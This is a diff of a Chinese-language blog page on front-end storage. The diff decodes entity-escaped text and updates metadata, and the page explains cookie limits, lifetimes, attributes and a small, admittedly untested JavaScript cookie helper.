@@ -86,12 +86,14 @@
 
 
 
-<meta name="description" content="&amp;#x4E00;&amp;#x3001;cookiecookie&amp;#x662F;&amp;#x6D4F;&amp;#x89C8;&amp;#x5668;&amp;#x4FDD;&amp;#x5B58;&amp;#x5728;&amp;#x7528;&amp;#x6237;&amp;#x8BA1;&amp;#x7B97;&amp;#x673A;&amp;#x4E0A;&amp;#x7684;&amp;#x5C11;&amp;#x91CF;&amp;#x6570;&amp;#x636E;&amp;#xFF0C;&amp;#x6BCF;&amp;#x6B21;&amp;#x5">
+<meta name="description" content="一、cookiecookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。 容量限制 存储容量较小，每个域名4K左右 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie  存储时长 如果设定了超时时间，cookie将在到期时失效。 如果没设定，将在关闭浏览器时失效。在未">
+<meta name="keywords" content="Javascript">
 <meta property="og:type" content="article">
 <meta property="og:title" content="前端常用存储技术总结">
 <meta property="og:url" content="http://supermaryy.com/2016/11/11/storage-in-frontent/index.html">
-<meta property="og:site_name" content="Mary's blog">
-<meta property="og:description" content="&amp;#x4E00;&amp;#x3001;cookiecookie&amp;#x662F;&amp;#x6D4F;&amp;#x89C8;&amp;#x5668;&amp;#x4FDD;&amp;#x5B58;&amp;#x5728;&amp;#x7528;&amp;#x6237;&amp;#x8BA1;&amp;#x7B97;&amp;#x673A;&amp;#x4E0A;&amp;#x7684;&amp;#x5C11;&amp;#x91CF;&amp;#x6570;&amp;#x636E;&amp;#xFF0C;&amp;#x6BCF;&amp;#x6B21;&amp;#x5">
+<meta property="og:site_name" content="Mary&#39;s blog">
+<meta property="og:description" content="一、cookiecookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。 容量限制 存储容量较小，每个域名4K左右 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie  存储时长 如果设定了超时时间，cookie将在到期时失效。 如果没设定，将在关闭浏览器时失效。在未">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png">
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png">
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png">
@@ -99,10 +101,10 @@
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png">
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png">
 <meta property="og:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png">
-<meta property="og:updated_time" content="2018-01-13T13:12:46.831Z">
+<meta property="og:updated_time" content="2018-05-07T10:29:59.603Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="前端常用存储技术总结">
-<meta name="twitter:description" content="&amp;#x4E00;&amp;#x3001;cookiecookie&amp;#x662F;&amp;#x6D4F;&amp;#x89C8;&amp;#x5668;&amp;#x4FDD;&amp;#x5B58;&amp;#x5728;&amp;#x7528;&amp;#x6237;&amp;#x8BA1;&amp;#x7B97;&amp;#x673A;&amp;#x4E0A;&amp;#x7684;&amp;#x5C11;&amp;#x91CF;&amp;#x6570;&amp;#x636E;&amp;#xFF0C;&amp;#x6BCF;&amp;#x6B21;&amp;#x5">
+<meta name="twitter:description" content="一、cookiecookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。 容量限制 存储容量较小，每个域名4K左右 并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条 超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie  存储时长 如果设定了超时时间，cookie将在到期时失效。 如果没设定，将在关闭浏览器时失效。在未">
 <meta name="twitter:image" content="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png">
 
 
@@ -365,85 +367,85 @@
       
 
       
-        <h1 id="&#x4E00;&#x3001;cookie"><a href="#&#x4E00;&#x3001;cookie" class="headerlink" title="&#x4E00;&#x3001;cookie"></a>&#x4E00;&#x3001;cookie</h1><p>cookie&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x4FDD;&#x5B58;&#x5728;&#x7528;&#x6237;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;&#x7684;&#x5C11;&#x91CF;&#x6570;&#x636E;&#xFF0C;&#x6BCF;&#x6B21;&#x53D1;&#x9001;HTTP&#x8BF7;&#x6C42;&#x65F6;&#x81EA;&#x52A8;&#x5730;&#x5728;&#x9644;&#x5728;HTTP&#x5934;&#x90E8;&#x91CC;&#x3002;</p>
-<h2 id="&#x5BB9;&#x91CF;&#x9650;&#x5236;"><a href="#&#x5BB9;&#x91CF;&#x9650;&#x5236;" class="headerlink" title="&#x5BB9;&#x91CF;&#x9650;&#x5236;"></a>&#x5BB9;&#x91CF;&#x9650;&#x5236;</h2><ol>
-<li>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x8F83;&#x5C0F;&#xFF0C;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;4K&#x5DE6;&#x53F3;</li>
-<li>&#x5E76;&#x6709;&#x5B58;&#x50A8;&#x6761;&#x6570;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x4E0A;&#x9650;&#x4E0D;&#x540C;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;20~50&#x6761;</li>
-<li>&#x8D85;&#x51FA;&#x9650;&#x5236;&#x4E0D;&#x4F1A;&#x505A;&#x4EFB;&#x4F55;&#x63D0;&#x9192;&#xFF0C;&#x540E;&#x5199;&#x5165;&#x7684;cookie &#x4F1A;&#x76D6;&#x6389;&#x524D;&#x9762;&#x7684;cookie</li>
+        <h1 id="一、cookie"><a href="#一、cookie" class="headerlink" title="一、cookie"></a>一、cookie</h1><p>cookie是浏览器保存在用户计算机上的少量数据，每次发送HTTP请求时自动地在附在HTTP头部里。</p>
+<h2 id="容量限制"><a href="#容量限制" class="headerlink" title="容量限制"></a>容量限制</h2><ol>
+<li>存储容量较小，每个域名4K左右</li>
+<li>并有存储条数的限制，不同浏览器上限不同，一般在每个域名20~50条</li>
+<li>超出限制不会做任何提醒，后写入的cookie 会盖掉前面的cookie</li>
 </ol>
-<h2 id="&#x5B58;&#x50A8;&#x65F6;&#x957F;"><a href="#&#x5B58;&#x50A8;&#x65F6;&#x957F;" class="headerlink" title="&#x5B58;&#x50A8;&#x65F6;&#x957F;"></a>&#x5B58;&#x50A8;&#x65F6;&#x957F;</h2><ol>
-<li>&#x5982;&#x679C;&#x8BBE;&#x5B9A;&#x4E86;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;cookie&#x5C06;&#x5728;&#x5230;&#x671F;&#x65F6;&#x5931;&#x6548;&#x3002;</li>
-<li><strong>&#x5982;&#x679C;&#x6CA1;&#x8BBE;&#x5B9A;&#xFF0C;&#x5C06;&#x5728;&#x5173;&#x95ED;&#x6D4F;&#x89C8;&#x5668;&#x65F6;&#x5931;&#x6548;&#x3002;</strong>&#x5728;&#x672A;&#x5173;&#x95ED;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6240;&#x6709;&#x7684;tab&#x7EA7;&#x522B;&#x7684;&#x9875;&#x9762;&#x65B0;&#x5F00;&#x6216;&#x5237;&#x65B0;&#xFF0C;cookie&#x90FD;&#x53EF;&#x7528;&#x3002;<strong>&#xFF08;&#x533A;&#x522B;&#x4E8E;sessionStorage&#x7684;Tab&#x7EA7;session&#xFF09;</strong></li>
+<h2 id="存储时长"><a href="#存储时长" class="headerlink" title="存储时长"></a>存储时长</h2><ol>
+<li>如果设定了超时时间，cookie将在到期时失效。</li>
+<li><strong>如果没设定，将在关闭浏览器时失效。</strong>在未关闭浏览器的情况下，所有的tab级别的页面新开或刷新，cookie都可用。<strong>（区别于sessionStorage的Tab级session）</strong></li>
 </ol>
-<h2 id="&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;"><a href="#&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;"></a>&#x5178;&#x578B;&#x4F7F;&#x7528;&#x573A;&#x666F;</h2><ol>
-<li><p>Session&#x7BA1;&#x7406;&#xFF1A;&#x767B;&#x5F55;&#x3001;&#x8D2D;&#x7269;&#x8F66;&#x3001;&#x6E38;&#x620F;&#x5F97;&#x5206;&#x7B49;&#x7528;&#x6237;&#x72B6;&#x6001;</p>
+<h2 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h2><ol>
+<li><p>Session管理：登录、购物车、游戏得分等用户状态</p>
 </li>
-<li><p>&#x4FDD;&#x5B58;&#x7528;&#x6237;&#x4E2A;&#x6027;&#x5316;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F7F;&#x7528;&#x504F;&#x597D;&#x3001;&#x4E3B;&#x9898;&#x7B49;</p>
+<li><p>保存用户个性化设置，使用偏好、主题等</p>
 </li>
-<li><p>&#x7528;&#x6237;&#x8DDF;&#x8E2A;&#xFF0C;&#x8BB0;&#x5F55;&#x548C;&#x5206;&#x6790;&#x7528;&#x6237;&#x884C;&#x4E3A;</p>
+<li><p>用户跟踪，记录和分析用户行为</p>
 </li>
 </ol>
-<h2 id="&#x4F7F;&#x7528;&#x6CE8;&#x610F;"><a href="#&#x4F7F;&#x7528;&#x6CE8;&#x610F;" class="headerlink" title="&#x4F7F;&#x7528;&#x6CE8;&#x610F;"></a>&#x4F7F;&#x7528;&#x6CE8;&#x610F;</h2><ol>
-<li>&#x56E0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;cookie&#x5BB9;&#x91CF;&#x6709;&#x9650;&#xFF0C;&#x5E76;&#x4E14;&#x4F1A;&#x5728;&#x6BCF;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x4E2D;&#x90FD;&#x9644;&#x5E26;cookie&#xFF0C;&#x6240;&#x4EE5;&#x5E94;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x4F7F;&#x7528;cookie&#xFF0C;&#x4EC5;&#x662F;&#x4E3A;&#x4E86;&#x5BA2;&#x6237;&#x7AEF;&#x5B58;&#x50A8;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;Web Storage&#x66FF;&#x4EE3;&#x3002;&#x53EA;&#x6709;&#x9700;&#x8981;&#x6BCF;&#x6B21;&#x8BF7;&#x6C42;&#x90FD;&#x9700;&#x8981;&#x9644;&#x5E26;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x624D;&#x9700;&#x8981;&#x4F7F;&#x7528;cookie&#xFF0C;&#x4F8B;&#x5982;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x4FE1;&#x606F;&#x3002;</li>
-<li>cookie&#x7684;&#x540D;/&#x503C;&#x5BF9;&#x4E2D;&#x7684;&#x503C;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x5206;&#x53F7;&#x3001;&#x9017;&#x53F7;&#x548C;&#x7A7A;&#x767D;&#x7B26;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x8BBE;&#x7F6E;cookie&#x65F6;&#x8981;&#x5148;&#x7528;encodeURIComponent()&#x7F16;&#x7801;&#xFF0C;&#x8BFB;&#x53D6;&#x65F6;&#x89E3;&#x7801;&#x3002;</li>
+<h2 id="使用注意"><a href="#使用注意" class="headerlink" title="使用注意"></a>使用注意</h2><ol>
+<li>因为浏览器cookie容量有限，并且会在每一次请求中都附带cookie，所以应尽量避免使用cookie，仅是为了客户端存储的话，可以用Web Storage替代。只有需要每次请求都需要附带的信息，才需要使用cookie，例如身份验证信息。</li>
+<li>cookie的名/值对中的值不允许出现分号、逗号和空白符，因此在设置cookie时要先用encodeURIComponent()编码，读取时解码。</li>
 </ol>
-<h2 id="&#x57FA;&#x672C;API"><a href="#&#x57FA;&#x672C;API" class="headerlink" title="&#x57FA;&#x672C;API"></a>&#x57FA;&#x672C;API</h2><p><strong>&#x540E;&#x7AEF;&#x8BBE;&#x7F6E;cookie&#xFF1A;</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>
-<p>&#x540E;&#x7AEF;&#x63A5;&#x6536;&#x5230;&#x524D;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5305;&#x542B;<code>Set-Cookie</code>&#x7684;&#x54CD;&#x5E94;&#x5934;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x63A5;&#x6536;&#x54CD;&#x5E94;&#x540E;&#x5C31;&#x4F1A;&#x5B58;&#x50A8;&#x8BE5;cookie&#xFF0C;&#x5E76;&#x5728;&#x4E4B;&#x540E;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x4E2D;&#x81EA;&#x52A8;&#x9644;&#x5E26;&#x8FD9;&#x4E2A;cookie&#xFF0C;&#x76F4;&#x5230;&#x8FC7;&#x4E86;&#x8D85;&#x65F6;&#x671F;&#x9650;</p>
-<p><strong>&#x524D;&#x7AEF;&#x8BBE;&#x7F6E;cookie&#xFF1A;</strong><code>document.cookie = &quot;name=value[;expires=date][;path=path-to-resource][;domain=&#x57DF;&#x540D;][;secure]&quot;</code></p>
-<p>&#x56E0;&#x4E3A;<code>document.cookie</code>&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x4E2D;&#x9700;&#x8981;&#x9891;&#x7E41;&#x64CD;&#x4F5C;cookie&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x628A;&#x76F8;&#x5173;&#x65B9;&#x6CD5;&#x5C01;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x4E5F;&#x6709;&#x4E00;&#x4E9B;&#x73B0;&#x6210;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5982;<code>jquery.cookie.js</code>&#x3001;<code>js.cookie</code>&#x7B49;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6211;&#x7684;&#x7B80;&#x5355;&#x5C01;&#x88C5;&#xFF08;&#x672A;&#x7ECF;&#x8C03;&#x8BD5;&#xFF0C;&#x53EA;&#x662F;&#x5199;&#x4E0B;&#x601D;&#x8DEF;&#xFF09;&#xFF1A;</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> cookieObj = {</div><div class="line">	get:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>{</div><div class="line">		<span class="keyword">if</span>(!keyName){</div><div class="line">  			alert(<span class="string">&apos;superMary says&#xFF1A;cookieObj.get need a param&#xFF01;&apos;</span>);</div><div class="line">  			<span class="keyword">return</span>;</div><div class="line">		}</div><div class="line">		<span class="keyword">var</span> encodedKeyName = <span class="built_in">encodeURIComponent</span>(keyName);</div><div class="line">		<span class="keyword">var</span> docCookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">&apos;;&apos;</span>);</div><div class="line">		<span class="keyword">var</span> resultCookie = docCookieArr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>{</div><div class="line">			<span class="keyword">var</span> cookieArr = item.split(<span class="string">&apos;=&apos;</span>);</div><div class="line">  			<span class="keyword">return</span> cookieArr[<span class="number">0</span>] === encodedKeyName;</div><div class="line">		})</div><div class="line">		<span class="keyword">if</span>(resultCookie.length&gt;<span class="number">0</span>){</div><div class="line">  			<span class="keyword">return</span> resultCookie[<span class="number">0</span>].split(<span class="string">&apos;=&apos;</span>)[<span class="number">1</span>];</div><div class="line">		}</div><div class="line">		alert(<span class="string">&apos;superMary says&#xFF1A;not find the cookie of&apos;</span>+ keyName);		</div><div class="line">	},</div><div class="line">	</div><div class="line">	set:<span class="function"><span class="keyword">function</span>(<span class="params">oCookie</span>)</span>{</div><div class="line">  		<span class="keyword">var</span> cookieStr = <span class="built_in">encodeURIComponent</span>(oCookie.keyName) + <span class="string">&apos;=&apos;</span> + <span class="built_in">encodeURIComponent</span>(oCookie.keyValue);</div><div class="line">  		<span class="keyword">if</span>(oCookie.expires){</div><div class="line">  			cookieStr += <span class="string">&apos;;expires=&apos;</span> + oCookie.expires;</div><div class="line">		}</div><div class="line">      	<span class="keyword">if</span>(oCookie.path){</div><div class="line">  			cookieStr += <span class="string">&apos;;path=&apos;</span> + oCookie.path;</div><div class="line">		}</div><div class="line">      	<span class="keyword">if</span>(oCookie.Domain){</div><div class="line">  			cookieStr += <span class="string">&apos;;path=&apos;</span> + oCookie.path;</div><div class="line">		}</div><div class="line">      	<span class="comment">// secure&#x548C;httpOnly...</span></div><div class="line">	},</div><div class="line">  	delCookie:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>{</div><div class="line">  		<span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">      	date.setHours(<span class="number">-1</span>);</div><div class="line">      	<span class="keyword">this</span>.set({</div><div class="line">          keyName:keyName,</div><div class="line">          expires:date</div><div class="line">		})</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>
-<h2 id="cookie&#x5C5E;&#x6027;"><a href="#cookie&#x5C5E;&#x6027;" class="headerlink" title="cookie&#x5C5E;&#x6027;"></a>cookie&#x5C5E;&#x6027;</h2><p>&#x4EE5;CSDN&#x7F51;&#x7AD9;&#x7684;cookie&#x4E3A;&#x4F8B;&#xFF1A;</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png" alt="&#x56FE;0_CSDN&#x7F51;&#x7AD9;&#x7684;cookie"></p>
-<p>&#x4E3B;&#x8981;&#x4ECB;&#x7ECD;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF1A;Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>
-<h3 id="&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027;-Expires-Max-Age"><a href="#&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027;-Expires-Max-Age" class="headerlink" title="&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027; Expires / Max-Age"></a>&#x65F6;&#x95F4;&#x7C7B;&#x5C5E;&#x6027; Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
-<p>Expires&#xFF1A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;GMT&#x683C;&#x5F0F;&#x7684;&#x7EDD;&#x5BF9;&#x65F6;&#x95F4;</p>
-<p>Max-Age&#xFF1A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x4EE5;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x76F8;&#x5BF9;&#x65F6;&#x95F4;&#xFF0C;&#x76F8;&#x5BF9;&#x7684;&#x662F;&#x6587;&#x6863;&#x7B2C;&#x4E00;&#x6B21;&#x88AB;&#x8BF7;&#x6C42;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#x95F4;</p>
-<h3 id="&#x57DF;&#x7C7B;&#x5C5E;&#x6027;-Domain-Path"><a href="#&#x57DF;&#x7C7B;&#x5C5E;&#x6027;-Domain-Path" class="headerlink" title="&#x57DF;&#x7C7B;&#x5C5E;&#x6027; Domain / Path"></a>&#x57DF;&#x7C7B;&#x5C5E;&#x6027; Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
+<h2 id="基本API"><a href="#基本API" class="headerlink" title="基本API"></a>基本API</h2><p><strong>后端设置cookie：</strong> <code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></p>
+<p>后端接收到前端的请求时，返回一个包含<code>Set-Cookie</code>的响应头，浏览器接收响应后就会存储该cookie，并在之后的每一次请求中自动附带这个cookie，直到过了超时期限</p>
+<p><strong>前端设置cookie：</strong><code>document.cookie = &quot;name=value[;expires=date][;path=path-to-resource][;domain=域名][;secure]&quot;</code></p>
+<p>因为<code>document.cookie</code>是一个字符串，所以如果系统中需要频繁操作cookie，一般会把相关方法封装一下，也有一些现成的工具，如<code>jquery.cookie.js</code>、<code>js.cookie</code>等，下面是我的简单封装（未经调试，只是写下思路）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cookieObj = &#123;</span><br><span class="line">	get:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!keyName)&#123;</span><br><span class="line">  			alert(<span class="string">'superMary says：cookieObj.get need a param！'</span>);</span><br><span class="line">  			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">var</span> encodedKeyName = <span class="built_in">encodeURIComponent</span>(keyName);</span><br><span class="line">		<span class="keyword">var</span> docCookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>);</span><br><span class="line">		<span class="keyword">var</span> resultCookie = docCookieArr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item,index</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">var</span> cookieArr = item.split(<span class="string">'='</span>);</span><br><span class="line">  			<span class="keyword">return</span> cookieArr[<span class="number">0</span>] === encodedKeyName;</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">if</span>(resultCookie.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  			<span class="keyword">return</span> resultCookie[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		alert(<span class="string">'superMary says：not find the cookie of'</span>+ keyName);		</span><br><span class="line">	&#125;,</span><br><span class="line">	</span><br><span class="line">	set:<span class="function"><span class="keyword">function</span>(<span class="params">oCookie</span>)</span>&#123;</span><br><span class="line">  		<span class="keyword">var</span> cookieStr = <span class="built_in">encodeURIComponent</span>(oCookie.keyName) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(oCookie.keyValue);</span><br><span class="line">  		<span class="keyword">if</span>(oCookie.expires)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';expires='</span> + oCookie.expires;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="keyword">if</span>(oCookie.path)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';path='</span> + oCookie.path;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="keyword">if</span>(oCookie.Domain)&#123;</span><br><span class="line">  			cookieStr += <span class="string">';path='</span> + oCookie.path;</span><br><span class="line">		&#125;</span><br><span class="line">      	<span class="comment">// secure和httpOnly...</span></span><br><span class="line">	&#125;,</span><br><span class="line">  	delCookie:<span class="function"><span class="keyword">function</span>(<span class="params">keyName</span>)</span>&#123;</span><br><span class="line">  		<span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">      	date.setHours(<span class="number">-1</span>);</span><br><span class="line">      	<span class="keyword">this</span>.set(&#123;</span><br><span class="line">          keyName:keyName,</span><br><span class="line">          expires:date</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="cookie属性"><a href="#cookie属性" class="headerlink" title="cookie属性"></a>cookie属性</h2><p>以CSDN网站的cookie为例：</p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_0.png" alt="图0_CSDN网站的cookie"></p>
+<p>主要介绍以下参数：Domain / Path / Expires / Max-Age / HTTPOnly /  Secure /  SameSite</p>
+<h3 id="时间类属性-Expires-Max-Age"><a href="#时间类属性-Expires-Max-Age" class="headerlink" title="时间类属性 Expires / Max-Age"></a>时间类属性 Expires / Max-Age</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></p>
+<p>Expires：指定一个GMT格式的绝对时间</p>
+<p>Max-Age：指定一个以秒为单位的相对时间，相对的是文档第一次被请求时服务器记录的请求时间</p>
+<h3 id="域类属性-Domain-Path"><a href="#域类属性-Domain-Path" class="headerlink" title="域类属性 Domain / Path"></a>域类属性 Domain / Path</h3><p><code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
 <ol>
-<li><p>&#x8868;&#x793A;cookie&#x6240;&#x5728;&#x7684;&#x57DF;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;html&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x57DF;&#x540D;&#xFF0C;path&#x4E3A;html&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x8DEF;&#x5F84;&#x3002;</p>
-<p>&#x4F8B;&#xFF1A;&#x4E3A;<a href="http://www.baidu.com/test/testCookie.html" target="_blank" rel="external">http://www.baidu.com/test/testCookie.html</a> &#x9875;&#x9762;&#x4E2D;&#x7684;js&#x8BBE;&#x7F6E;cookie&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;cookie&#x7684;&#x7684;Domain&#x4E3A;&#xFF1A;.baidu.com&#xFF0C;Path&#x4E3A;&#xFF1A;/test</p>
+<li><p>表示cookie所在的域，默认为html文件所在的域名，path为html文件所在的路径。</p>
+<p>例：为<a href="http://www.baidu.com/test/testCookie.html" target="_blank" rel="noopener">http://www.baidu.com/test/testCookie.html</a> 页面中的js设置cookie，默认情况下cookie的的Domain为：.baidu.com，Path为：/test</p>
 </li>
-<li><p>cookie&#x53EA;&#x80FD;&#x88AB;&#x8BE5;Domain&#x57DF;&#x540D;&#x6216;&#x5176;&#x5B50;&#x57DF;&#x540D;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x8BBF;&#x95EE;</p>
+<li><p>cookie只能被该Domain域名或其子域名下的页面访问</p>
 </li>
-<li><p>cookie&#x53EA;&#x80FD;&#x88AB;&#x8BE5;Path&#x8DEF;&#x5F84;&#x6216;&#x5176;&#x5B50;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x9875;&#x9762;&#x8BBF;&#x95EE;</p>
+<li><p>cookie只能被该Path路径或其子路径下的页面访问</p>
 <ol>
-<li><p>&#x4E8C;&#x7EA7;&#x57DF;&#x540D;&#x95F4;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;Domain&#x5171;&#x4EAB;Cookie&#xFF0C;&#x5B9E;&#x73B0;&#x8DE8;&#x57DF;&#x3002;</p>
-<p>&#x200B;&#x4F8B;&#x5982;&#xFF1A;a.baidu.com      b.baidu.com<code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
+<li><p>二级域名间可以通过设置Domain共享Cookie，实现跨域。</p>
+<p>​例如：a.baidu.com      b.baidu.com<code>Set-Cookie: id=a3fWa;Domain=.baidu.com;Path = /;</code></p>
 </li>
 </ol>
 </li>
 </ol>
